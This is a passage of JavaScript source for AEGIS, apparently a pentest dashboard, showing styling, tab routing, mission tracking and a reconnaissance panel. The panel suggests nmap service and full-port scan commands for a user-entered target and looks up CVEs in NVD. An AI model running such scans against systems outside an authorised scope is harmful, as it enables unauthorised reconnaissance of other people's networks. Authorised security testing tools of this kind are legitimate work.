      '.ag-sub{color:var(--mut);font-size:.7rem;letter-spacing:.05em;text-transform:uppercase}' +
      '.ag-dot{width:8px;height:8px;border-radius:50%;background:#00e676;box-shadow:0 0 8px #00e676;animation:ag-pulse 2s ease-in-out infinite}' +
      '@keyframes ag-pulse{0%,100%{opacity:1}50%{opacity:.4}}' +
      '.ag-tabs{display:flex;gap:2px;overflow-x:auto;padding:10px 0 0;border-bottom:none}' +
      '.ag-tab{background:transparent;border:none;border-bottom:2px solid transparent;color:var(--mut);padding:8px 14px;font-size:.68rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;cursor:pointer;transition:all .2s;font-family:inherit;white-space:nowrap;flex-shrink:0}' +
      '.ag-tab:hover{color:var(--txt);background:rgba(255,255,255,.03)}' +
      '.ag-tab.on{color:var(--acc);border-bottom-color:var(--acc);text-shadow:0 0 8px color-mix(in srgb,var(--acc) 40%,transparent)}' +
      '.ag-panel{background:var(--card);border:1px solid var(--line);border-radius:4px;overflow:hidden;margin-bottom:10px}' +
      '.ag-panel-h{padding:8px 12px;border-bottom:1px solid var(--line);background:rgba(0,0,0,.15);font-size:.68rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--mut);display:flex;align-items:center;gap:8px}' +
      '.ag-panel-b{padding:12px}' +
      '.ag-grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}' +
      '.ag-grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}' +
      '.ag-grid4{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}' +
      '.ag-stat{background:rgba(0,0,0,.2);border:1px solid var(--line);border-radius:4px;padding:10px 14px}' +
      '.ag-stat-v{font-size:1.3rem;font-weight:700;font-variant-numeric:tabular-nums}' +
      '.ag-stat-l{font-size:.6rem;color:var(--mut);letter-spacing:.04em;text-transform:uppercase;margin-top:2px}' +
      '.ag-btn{background:transparent;border:1px solid var(--acc);color:var(--acc);padding:6px 14px;font-size:.68rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;border-radius:3px;cursor:pointer;font-family:inherit;transition:all .15s}' +
      '.ag-btn:hover{background:var(--acc);color:var(--bg);box-shadow:0 0 12px color-mix(in srgb,var(--acc) 40%,transparent)}' +
      '.ag-btn-ghost{border-color:var(--line);color:var(--mut)}' +
      '.ag-btn-ghost:hover{border-color:var(--txt);color:var(--txt);background:rgba(255,255,255,.05);box-shadow:none}' +
      '.ag-btn-danger{border-color:#ff1744;color:#ff1744}' +
      '.ag-btn-danger:hover{background:#ff1744;color:#fff}' +
      '.ag-sel{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:6px 10px;border-radius:3px;font-size:.72rem;font-family:inherit}' +
      '.ag-sel:focus{border-color:var(--acc);outline:none}' +
      '.ag-inp{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:6px 10px;border-radius:3px;font-size:.72rem;font-family:inherit;width:100%;box-sizing:border-box}' +
      '.ag-inp:focus{border-color:var(--acc);outline:none}' +
      '.ag-textarea{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:8px 10px;border-radius:3px;font-size:.72rem;font-family:inherit;width:100%;box-sizing:border-box;resize:vertical;min-height:80px}' +
      '.ag-textarea:focus{border-color:var(--acc);outline:none}' +
      '.ag-tbl{width:100%;border-collapse:collapse;font-size:.72rem}' +
      '.ag-tbl th{padding:6px 8px;text-align:left;color:var(--mut);border-bottom:2px solid var(--line);font-weight:600;letter-spacing:.03em;text-transform:uppercase;font-size:.62rem}' +
      '.ag-tbl td{padding:6px 8px;border-bottom:1px solid var(--line)}' +
      '.ag-tbl tr:hover{background:rgba(255,255,255,.02)}' +
      '.ag-badge{display:inline-block;padding:2px 8px;border-radius:2px;font-size:.6rem;font-weight:600;letter-spacing:.03em;text-transform:uppercase}' +
      '.ag-crit{background:rgba(255,23,68,.15);color:#ff1744;border:1px solid rgba(255,23,68,.3)}' +
      '.ag-high{background:rgba(255,145,0,.15);color:#ff9100;border:1px solid rgba(255,145,0,.3)}' +
      '.ag-med{background:rgba(255,214,0,.15);color:#ffd600;border:1px solid rgba(255,214,0,.3)}' +
      '.ag-low{background:rgba(0,230,118,.15);color:#00e676;border:1px solid rgba(0,230,118,.3)}' +
      '.ag-info{background:rgba(0,229,255,.15);color:#00e5ff;border:1px solid rgba(0,229,255,.3)}' +
      '.ag-threat-bar{display:flex;gap:2px;margin:8px 0}' +
      '.ag-threat-seg{height:24px;flex:1;border-radius:2px;text-align:center;font-size:.6rem;line-height:24px;font-weight:600;cursor:pointer;transition:all .2s}' +
      '.ag-feed-item{padding:6px 0;border-bottom:1px solid var(--line);font-size:.7rem;display:flex;gap:8px;align-items:flex-start}' +
      '.ag-feed-time{color:var(--mut);white-space:nowrap;font-size:.62rem}' +
      '.ag-scanline{position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--acc),transparent);opacity:.2;animation:ag-scan 5s linear infinite;pointer-events:none}' +
      '@keyframes ag-scan{0%{transform:translateY(0)}100%{transform:translateY(600px)}}' +
      '.ag-apt-card{background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px;transition:border-color .2s}' +
      '.ag-apt-card:hover{border-color:var(--acc)}' +
      '.ag-topo-node{position:absolute;padding:6px 10px;border:1px solid var(--line);border-radius:3px;font-size:.6rem;font-weight:600;text-align:center;cursor:pointer;transition:all .2s;letter-spacing:.03em;text-transform:uppercase}' +
      '.ag-topo-node:hover{border-color:var(--acc);z-index:10}' +
      '.ag-defcon{display:flex;gap:4px;align-items:center;justify-content:center}' +
      '.ag-defcon-level{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:1rem;transition:all .3s}' +
      '.ag-gauge{position:relative;width:120px;height:60px;margin:0 auto}' +
      '.ag-health-bar{height:6px;background:var(--line);border-radius:3px;overflow:hidden;margin:2px 0}' +
      '.ag-health-fill{height:100%;border-radius:3px;transition:width .5s}' +
      '.ag-mitre-cell{padding:4px 6px;border:1px solid var(--line);font-size:.55rem;cursor:pointer;transition:all .15s;text-align:center}' +
      '.ag-mitre-cell:hover{background:rgba(0,229,255,.15);border-color:var(--acc)}' +
      '.ag-mitre-cell.active{background:rgba(255,23,68,.2);border-color:#ff1744;color:#ff1744}' +
      '.ag-chain-step{display:flex;align-items:center;gap:8px;padding:8px;border-left:3px solid var(--line);margin-left:12px;font-size:.7rem}' +
      '.ag-chain-step.crit{border-left-color:#ff1744}' +
      '.ag-chain-step.high{border-left-color:#ff9100}' +
      '.ag-evidence-row{display:flex;align-items:center;gap:12px;padding:8px;border-bottom:1px solid var(--line);font-size:.7rem}' +
      '.ag-seg-tbl{border-collapse:collapse;font-size:.55rem;width:100%}' +
      '.ag-seg-tbl th{padding:4px 3px;color:var(--mut);text-align:center;font-weight:600;letter-spacing:.02em;border-bottom:2px solid var(--line);white-space:nowrap}' +
      '.ag-seg-tbl th.ag-seg-rowh,.ag-seg-tbl td.ag-seg-rowh{text-align:left;color:var(--txt);font-weight:600;border-right:2px solid var(--line);white-space:nowrap;padding-right:8px}' +
      '.ag-seg-cell{padding:4px 2px;text-align:center;font-weight:700;border:1px solid var(--line);border-radius:2px;font-size:.5rem}' +
      '.ag-fw-mono{font-variant-numeric:tabular-nums}' +
      '.ag-fw-diag{border-left:3px solid var(--line);padding:6px 10px;margin:4px 0;font-size:.68rem;background:rgba(0,0,0,.15)}' +
      '</style>' +
      '<div class="ag-wrap">' +
        '<div class="ag-cls-banner" style="background:' + clsColor + '">' + esc(cls) + '</div>' +
        '<div class="ag-scanline"></div>' +
        '<div class="ag-header">' +
          '<h1 class="ag-title">AEGIS</h1>' +
          '<div class="ag-dot"></div>' +
          '<span class="ag-sub">Autonomous Electronic Governance & Intelligence System</span>' +
          '<span style="flex:1"></span>' +
          (mission ? '<span class="ag-sub" style="color:var(--acc)">MISSION: ' + esc(mission.name) + '</span>' : '<span class="ag-sub" style="color:var(--mut)">NO ACTIVE MISSION</span>') +
        '</div>' +
        '<div class="ag-tabs">' +
          ['command:Command Center','missions:Missions','recon:Reconnaissance','vuln:Vulnerabilities','planning:Attack Planning','intel:Threat Intel','defense:Defense Ops','crypto:Crypto Lab','noc:NOC','rulebase:Rule Base','simulator:Policy Sim','segmentation:Segmentation','flowaudit:Flow Audit','exploit:Exploit Lab','adplanner:AD Planner','cloud:Cloud Attack','hunting:Threat Hunt','warroom:War Room','comms:Comms Log','reporting:Reporting','settings:Settings'].map(function(t) {
            var p = t.split(':');
            return '<button class="ag-tab' + (activeTab === p[0] ? ' on' : '') + '" data-t="' + p[0] + '">' + p[1] + '</button>';
          }).join('') +
        '</div>' +
        '<div id="ag-content" style="margin-top:10px"></div>' +
      '</div>';

    main.querySelector('.ag-tabs').onclick = function(e) {
      var b = e.target.closest('.ag-tab');
      if (b) { activeTab = b.dataset.t; render(); }
    };

    var content = main.querySelector('#ag-content');
    if (activeTab === 'command') renderCommand(content, mission);
    else if (activeTab === 'missions') renderMissions(content);
    else if (activeTab === 'recon') renderRecon(content, mission);
    else if (activeTab === 'vuln') renderVuln(content, mission);
    else if (activeTab === 'planning') renderPlanning(content, mission);
    else if (activeTab === 'intel') renderIntel(content, mission);
    else if (activeTab === 'defense') renderDefense(content, mission);
    else if (activeTab === 'crypto') renderCrypto(content);
    else if (activeTab === 'noc') renderNOC(content);
    else if (activeTab === 'rulebase') renderRuleBase(content);
    else if (activeTab === 'simulator') renderPolicySim(content);
    else if (activeTab === 'segmentation') renderSegmentation(content);
    else if (activeTab === 'flowaudit') renderFlowAudit(content);
    else if (activeTab === 'exploit') renderExploitLab(content);
    else if (activeTab === 'adplanner') renderADPlanner(content);
    else if (activeTab === 'cloud') renderCloudAttack(content);
    else if (activeTab === 'hunting') renderThreatHunting(content, mission);
    else if (activeTab === 'warroom') renderWarRoom(content, mission);
    else if (activeTab === 'comms') renderCommsLog(content, mission);
    else if (activeTab === 'reporting') renderReporting(content, mission);
    else if (activeTab === 'settings') renderSettings(content);
  }

  // ========== EXPANDED COMMAND CENTER ==========
  function renderCommand(c, mission) {
    var findings = mission ? (mission.findings || []) : [];
    var crit = findings.filter(function(f){return f.severity==='Critical'}).length;
    var high = findings.filter(function(f){return f.severity==='High'}).length;
    var med = findings.filter(function(f){return f.severity==='Medium'}).length;
    var low = findings.filter(function(f){return f.severity==='Low'}).length;
    var info = findings.filter(function(f){return f.severity==='Info'}).length;
    var iocs = mission ? (mission.iocs || []).length : 0;
    var creds = mission ? (mission.credentials || []).length : 0;
    var hosts = mission ? (mission.hosts || []).length : 0;
    var actions = mission ? (mission.actions || []) : [];
    var score = Math.max(0, 100 - crit * 20 - high * 10 - med * 5 - low * 2);
    var threatLevel = crit > 0 ? 'SEVERE' : high > 2 ? 'HIGH' : high > 0 ? 'ELEVATED' : med > 0 ? 'GUARDED' : 'LOW';
    var threatColors = { LOW: '#00e676', GUARDED: '#2196f3', ELEVATED: '#ffd600', HIGH: '#ff9100', SEVERE: '#ff1744' };
    var defconLevel = crit > 3 ? 1 : crit > 1 ? 2 : crit > 0 ? 3 : high > 0 ? 4 : 5;
    var defconColors = { 1: '#ff1744', 2: '#ff5252', 3: '#ffd600', 4: '#2196f3', 5: '#00e676' };
    var defconDescs = { 1: 'MAXIMUM READINESS', 2: 'ARMED FORCES READY', 3: 'INCREASE FORCE READINESS', 4: 'INCREASED INTELLIGENCE', 5: 'NORMAL READINESS' };

    // Fleet health requires the AEGIS VM agent for real metrics
    var fleetHealth = [];
    var topAlerts = NOC_ANOMALIES.slice(0, 10);

    c.innerHTML =
      '<div class="ag-grid3" style="margin-bottom:10px">' +
        // DEFCON Gauge
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">DEFCON LEVEL</span></div>' +
          '<div class="ag-panel-b" style="text-align:center">' +
            '<div class="ag-defcon">' +
              [5,4,3,2,1].map(function(l) {
                var active = l === defconLevel;
                return '<div class="ag-defcon-level" style="background:' + (active ? defconColors[l] : 'var(--line)') + ';color:' + (active ? '#000' : 'var(--mut)') + ';' + (active ? 'box-shadow:0 0 20px ' + defconColors[l] + ';transform:scale(1.2)' : '') + '">' + l + '</div>';
              }).join('') +
            '</div>' +
            '<div style="margin-top:8px;font-size:.72rem;font-weight:700;color:' + defconColors[defconLevel] + ';letter-spacing:.08em">' + defconDescs[defconLevel] + '</div>' +
          '</div>' +
        '</div>' +
        // Threat Level
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">THREAT LEVEL</span></div>' +
          '<div class="ag-panel-b" style="text-align:center">' +
            '<div style="font-size:2rem;font-weight:800;color:' + threatColors[threatLevel] + ';letter-spacing:.1em">' + threatLevel + '</div>' +
            '<div class="ag-threat-bar">' +
              ['LOW','GUARDED','ELEVATED','HIGH','SEVERE'].map(function(l) {
                var active = l === threatLevel;
                return '<div class="ag-threat-seg" style="background:' + (active ? threatColors[l] : 'var(--line)') + ';color:' + (active ? '#000' : 'var(--mut)') + '">' + l.charAt(0) + '</div>';
              }).join('') +
            '</div>' +
          '</div>' +
        '</div>' +
        // Security Posture
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">SECURITY POSTURE</span></div>' +
          '<div class="ag-panel-b" style="text-align:center">' +
            '<div style="font-size:2.5rem;font-weight:800;color:' + (score >= 80 ? '#00e676' : score >= 50 ? '#ffd600' : '#ff1744') + '">' + score + '</div>' +
            '<div style="font-size:.65rem;color:var(--mut);text-transform:uppercase;letter-spacing:.05em">out of 100</div>' +
            '<div style="height:6px;background:var(--line);border-radius:3px;margin-top:8px;overflow:hidden"><div style="height:100%;width:' + score + '%;background:' + (score >= 80 ? '#00e676' : score >= 50 ? '#ffd600' : '#ff1744') + ';border-radius:3px;transition:width .5s"></div></div>' +
          '</div>' +
        '</div>' +
      '</div>' +
      // Stats grid
      '<div class="ag-grid4" style="margin-bottom:10px">' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff1744">' + crit + '</div><div class="ag-stat-l">Critical</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff9100">' + high + '</div><div class="ag-stat-l">High</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600">' + med + '</div><div class="ag-stat-l">Medium</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e676">' + low + '</div><div class="ag-stat-l">Low</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e5ff">' + info + '</div><div class="ag-stat-l">Info</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#d500f9">' + iocs + '</div><div class="ag-stat-l">IOCs</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600">' + creds + '</div><div class="ag-stat-l">Credentials</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + hosts + '</div><div class="ag-stat-l">Hosts</div></div>' +
      '</div>' +
      '<div class="ag-grid2" style="margin-bottom:10px">' +
        // Network health panel
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">FLEET HEALTH</span></div>' +
          '<div class="ag-panel-b">' +
            '<div style="text-align:center;padding:16px;font-size:.72rem">' +
              '<div style="color:var(--mut);margin-bottom:8px">Fleet health monitoring requires the AEGIS VM agent.</div>' +
              '<div style="color:var(--acc);font-size:.65rem">Run: <code style="background:rgba(0,0,0,.3);padding:2px 6px;border-radius:3px">aegis --module fleet/health-monitor</code></div>' +
            '</div>' +
          '</div>' +
        '</div>' +
        // Top alerts ticker
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:#ff1744">TOP ALERTS</span><span style="flex:1"></span><span style="color:var(--mut)">' + topAlerts.length + ' active</span></div>' +
          '<div class="ag-panel-b" style="max-height:200px;overflow-y:auto">' +
            topAlerts.map(function(a) {
              var aCls = a.severity === 'Critical' ? 'ag-crit' : a.severity === 'High' ? 'ag-high' : a.severity === 'Medium' ? 'ag-med' : 'ag-low';
              return '<div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid var(--line);font-size:.68rem">' +
                '<span class="ag-badge ' + aCls + '" style="font-size:.55rem">' + esc(a.severity) + '</span>' +
                '<span style="color:var(--mut);font-size:.6rem">' + esc(a.time) + '</span>' +
                '<span style="color:var(--txt)">' + esc(a.type) + '</span>' +
                '<span style="flex:1;color:var(--mut);font-size:.62rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + esc(a.detail) + '</span>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +
      // Mission timeline + operator activity
      '<div class="ag-grid2">' +
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">MISSION STATUS TIMELINE</span></div>' +
          '<div class="ag-panel-b">' +
            (mission ? '<div style="font-size:.7rem">' +
              '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><div style="width:8px;height:8px;border-radius:50%;background:#00e676"></div><span style="color:var(--mut)">Created:</span><span>' + esc(mission.created || 'N/A') + '</span></div>' +
              '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><div style="width:8px;height:8px;border-radius:50%;background:var(--acc)"></div><span style="color:var(--mut)">Status:</span><span style="color:var(--acc)">' + esc(mission.status || 'Active') + '</span></div>' +
              '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><div style="width:8px;height:8px;border-radius:50%;background:#ffd600"></div><span style="color:var(--mut)">Target:</span><span>' + esc(mission.target || 'N/A') + '</span></div>' +
              '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><div style="width:8px;height:8px;border-radius:50%;background:#d500f9"></div><span style="color:var(--mut)">Findings:</span><span>' + findings.length + ' total</span></div>' +
              '<div style="display:flex;align-items:center;gap:8px"><div style="width:8px;height:8px;border-radius:50%;background:#ff9100"></div><span style="color:var(--mut)">Scope:</span><span>' + esc(mission.scope || 'Not defined') + '</span></div>' +
            '</div>' : '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:20px">No active mission.</div>') +
          '</div>' +
        '</div>' +
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">OPERATOR ACTIVITY LOG</span><span style="flex:1"></span><span style="color:var(--mut)">' + actions.length + ' actions</span></div>' +
          '<div class="ag-panel-b" style="max-height:200px;overflow-y:auto">' +
            (actions.length === 0 ? '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:20px">No activity yet. Create a mission and start scanning.</div>' :
            actions.slice(-15).reverse().map(function(a) {
              return '<div class="ag-feed-item"><span class="ag-feed-time">' + esc(a.time || '') + '</span><span>' + esc(a.text || '') + '</span></div>';
            }).join('')) +
          '</div>' +
        '</div>' +
      '</div>';
  }

  // ========== MISSIONS ==========
  function renderMissions(c) {
    var missions = loadMissions();
    var statusColors = { Planning: '#2196f3', Active: '#00e676', Paused: '#ffd600', Complete: '#00e5ff', Archived: '#666' };
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">NEW MISSION</span></div>' +
        '<div class="ag-panel-b">' +
          '<div class="ag-grid2" style="gap:8px;margin-bottom:8px">' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;letter-spacing:.03em">Mission Name</label><input class="ag-inp" id="ag-mname" placeholder="Operation Nightfall"></div>' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;letter-spacing:.03em">Target</label><input class="ag-inp" id="ag-mtarget" placeholder="10.0.0.0/24 or example.com"></div>' +
          '</div>' +
          '<div class="ag-grid2" style="gap:8px;margin-bottom:8px">' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;letter-spacing:.03em">Scope / Rules of Engagement</label><input class="ag-inp" id="ag-mscope" placeholder="Internal network only, no DoS"></div>' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;letter-spacing:.03em">Classification</label>' +
              '<select class="ag-sel" id="ag-mcls" style="width:100%"><option>UNCLASSIFIED</option><option>CUI</option><option>CONFIDENTIAL</option><option>SECRET</option><option>TOP SECRET</option></select></div>' +
          '</div>' +
          '<button class="ag-btn" id="ag-mcreate">CREATE MISSION</button>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">MISSIONS</span><span style="flex:1"></span><span style="color:var(--mut)">' + missions.length + ' total</span></div>' +
        '<div class="ag-panel-b">' +
          (missions.length === 0 ? '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:20px">No missions yet.</div>' :
          '<table class="ag-tbl"><thead><tr><th>Name</th><th>Target</th><th>Status</th><th>Findings</th><th>Created</th><th>Actions</th></tr></thead><tbody>' +
          missions.map(function(m) {
            var active = m.id === (getActiveMission() || {}).id;
            return '<tr style="' + (active ? 'background:rgba(0,229,255,.05)' : '') + '">' +
              '<td style="font-weight:600;color:' + (active ? 'var(--acc)' : 'var(--txt)') + '">' + esc(m.name) + '</td>' +
              '<td>' + esc(m.target) + '</td>' +
              '<td><span class="ag-badge" style="background:' + (statusColors[m.status] || '#666') + '22;color:' + (statusColors[m.status] || '#666') + ';border-color:' + (statusColors[m.status] || '#666') + '44">' + esc(m.status) + '</span></td>' +
              '<td>' + (m.findings || []).length + '</td>' +
              '<td style="color:var(--mut)">' + esc(m.created || '') + '</td>' +
              '<td><button class="ag-btn" style="padding:3px 8px;font-size:.6rem" data-load="' + esc(m.id) + '">LOAD</button></td>' +
              '</tr>';
          }).join('') +
          '</tbody></table>') +
        '</div>' +
      '</div>';

    c.querySelector('#ag-mcreate').onclick = function() {
      var name = c.querySelector('#ag-mname').value.trim();
      var target = c.querySelector('#ag-mtarget').value.trim();
      var scope = c.querySelector('#ag-mscope').value.trim();
      var cls = c.querySelector('#ag-mcls').value;
      if (!name || !target) return;
      var mission = { id: genId(), name: name, target: target, scope: scope, classification: cls, status: 'Active', created: new Date().toLocaleDateString(), findings: [], actions: [], iocs: [], credentials: [], hosts: [] };
      mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'Mission created: ' + name + ' targeting ' + target });
      updateMission(mission);
      setActiveMission(mission.id);
      render();
    };
    c.querySelectorAll('[data-load]').forEach(function(b) {
      b.onclick = function() { setActiveMission(b.dataset.load); render(); };
    });
  }

  // ========== EXPANDED RECONNAISSANCE ==========
  function renderRecon(c, mission) {
    if (!mission) { c.innerHTML = '<div style="color:var(--mut);text-align:center;padding:40px;font-size:.8rem">Create a mission first from the Missions tab.</div>'; return; }
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">RECONNAISSANCE</span></div>' +
        '<div class="ag-panel-b">' +
          '<div class="ag-grid3" style="margin-bottom:10px">' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Target</label><input class="ag-inp" id="ag-rtarget" value="' + esc(mission.target) + '"></div>' +
            '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Scan Type</label><select class="ag-sel" id="ag-rtype" style="width:100%"><option>Passive Only</option><option>Active</option><option>Full</option></select></div>' +
            '<div style="display:flex;align-items:flex-end"><button class="ag-btn" id="ag-rscan" style="width:100%">RUN SCAN</button></div>' +
          '</div>' +
        '</div>' +
      '</div>' +
      // Subdomain Enumeration
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">SUBDOMAIN ENUMERATION</span></div>' +
        '<div class="ag-panel-b">' +
          '<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">' +
            '<input class="ag-inp" id="ag-subdomain" placeholder="Enter root domain (e.g. example.com)" style="flex:1">' +
            '<button class="ag-btn" id="ag-subenum">ENUMERATE</button>' +
          '</div>' +
          '<div id="ag-subresults"></div>' +
        '</div>' +
      '</div>' +
      // DNS Records
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">DNS RECORD ANALYSIS</span></div>' +
        '<div class="ag-panel-b">' +
          '<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">' +
            '<input class="ag-inp" id="ag-dnsdomain" placeholder="Enter domain" style="flex:1">' +
            '<button class="ag-btn" id="ag-dnslookup">LOOKUP</button>' +
          '</div>' +
          '<div id="ag-dnsresults"></div>' +
        '</div>' +
      '</div>' +
      // WHOIS + Cert Transparency + Tech Stack
      '<div class="ag-grid2">' +
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">WHOIS LOOKUP</span></div>' +
          '<div class="ag-panel-b">' +
            '<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">' +
              '<input class="ag-inp" id="ag-whoisdom" placeholder="Enter domain" style="flex:1">' +
              '<button class="ag-btn" id="ag-whoislookup">WHOIS</button>' +
            '</div>' +
            '<div id="ag-whoisresults"></div>' +
          '</div>' +
        '</div>' +
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">TECHNOLOGY FINGERPRINT</span></div>' +
          '<div class="ag-panel-b">' +
            '<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">' +
              '<input class="ag-inp" id="ag-techdom" placeholder="Enter URL" style="flex:1">' +
              '<button class="ag-btn" id="ag-techscan">FINGERPRINT</button>' +
            '</div>' +
            '<div id="ag-techresults"></div>' +
          '</div>' +
        '</div>' +
      '</div>' +
      '<div id="ag-rresults"></div>';

    // Port scan handler — requires the shell server for real scanning
    c.querySelector('#ag-rscan').onclick = function() {
      var target = c.querySelector('#ag-rtarget').value.trim();
      var type = c.querySelector('#ag-rtype').value;
      if (!target) return;
      var results = c.querySelector('#ag-rresults');
      results.innerHTML =
        '<div class="ag-panel">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">PORT SCAN</span></div>' +
          '<div class="ag-panel-b" style="text-align:center;padding:20px">' +
            '<div style="color:var(--mut);font-size:.72rem;margin-bottom:10px">Port scanning cannot be performed from the browser. It requires direct network access via the shell server.</div>' +
            '<div style="color:var(--acc);font-size:.68rem;margin-bottom:6px">Connect via the Pentest Console to run:</div>' +
            '<code style="display:block;background:rgba(0,0,0,.3);padding:8px 12px;border-radius:3px;font-size:.7rem;color:#00e676;margin:4px auto;max-width:500px">nmap -sV ' + esc(target) + '</code>' +
            (type === 'Full' ? '<code style="display:block;background:rgba(0,0,0,.3);padding:8px 12px;border-radius:3px;font-size:.7rem;color:#00e676;margin:4px auto;max-width:500px">nmap -sV -sC -A -p- ' + esc(target) + '</code>' : '') +
            '<div style="color:var(--mut);font-size:.62rem;margin-top:10px">Or use the AEGIS VM app: <code style="background:rgba(0,0,0,.3);padding:2px 6px;border-radius:3px">aegis --module recon/port-scan --target ' + esc(target) + '</code></div>' +
          '</div>' +
        '</div>' +
        '<div class="ag-panel" style="margin-top:8px">' +
          '<div class="ag-panel-h"><span style="color:var(--acc)">NVD CVE SEARCH</span></div>' +
          '<div class="ag-panel-b" id="ag-nvdresults"><div style="color:var(--acc);font-size:.72rem;text-align:center;padding:10px">Searching NVD for known vulnerabilities related to ' + esc(target) + '...</div></div>' +
        '</div>';
      // Real NVD CVE search for the target
      var nvdContainer = results.querySelector('#ag-nvdresults');
      fetch('https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=' + encodeURIComponent(target) + '&resultsPerPage=20')
        .then(function(r) { return r.json(); })
        .then(function(data) {
          var vulns = (data.vulnerabilities || []);
          if (vulns.length === 0) {
            nvdContainer.innerHTML = '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:10px">No CVEs found in NVD for "' + esc(target) + '".</div>';
            return;
          }
          var rows = vulns.map(function(v) {
            var cve = v.cve || {};
            var id = cve.id || 'N/A';
            var desc = '';
            if (cve.descriptions) {
              var en = cve.descriptions.find(function(d) { return d.lang === 'en'; });
              desc = en ? en.value : (cve.descriptions[0] ? cve.descriptions[0].value : '');
            }
            var cvss = 0;
            var severity = 'Info';
            if (cve.metrics) {
              var m31 = cve.metrics.cvssMetricV31;
              var m2 = cve.metrics.cvssMetricV2;
              if (m31 && m31.length > 0) { cvss = m31[0].cvssData.baseScore; severity = m31[0].cvssData.baseSeverity; }
              else if (m2 && m2.length > 0) { cvss = m2[0].cvssData.baseScore; severity = cvss >= 9 ? 'CRITICAL' : cvss >= 7 ? 'HIGH' : cvss >= 4 ? 'MEDIUM' : 'LOW'; }
            }
            var cls = severity === 'CRITICAL' ? 'ag-crit' : severity === 'HIGH' ? 'ag-high' : severity === 'MEDIUM' ? 'ag-med' : 'ag-low';
            return '<tr><td><span class="ag-badge ' + cls + '">' + esc(severity) + '</span></td><td style="color:var(--acc);font-weight:600">' + esc(id) + '</td><td style="font-weight:600;color:' + (cvss >= 9 ? '#ff1744' : cvss >= 7 ? '#ff9100' : '#ffd600') + '">' + cvss + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(desc.substring(0, 200)) + (desc.length > 200 ? '...' : '') + '</td></tr>';
          });
          nvdContainer.innerHTML =
            '<div style="font-size:.68rem;color:var(--mut);margin-bottom:6px">' + vulns.length + ' CVEs found in NVD for "' + esc(target) + '"</div>' +
            '<table class="ag-tbl"><thead><tr><th>Severity</th><th>CVE</th><th>CVSS</th><th>Description</th></tr></thead><tbody>' +
            rows.join('') +
            '</tbody></table>';
          mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'NVD CVE search for ' + target + ': ' + vulns.length + ' results' });
          updateMission(mission);
        })
        .catch(function(err) {
          nvdContainer.innerHTML = '<div style="color:#ff9100;font-size:.72rem;text-align:center;padding:10px">NVD API unavailable: ' + esc(String(err.message || err)) + '. Try again later or use the VM version.</div>';
        });
    };

    // Subdomain enumeration via crt.sh certificate transparency
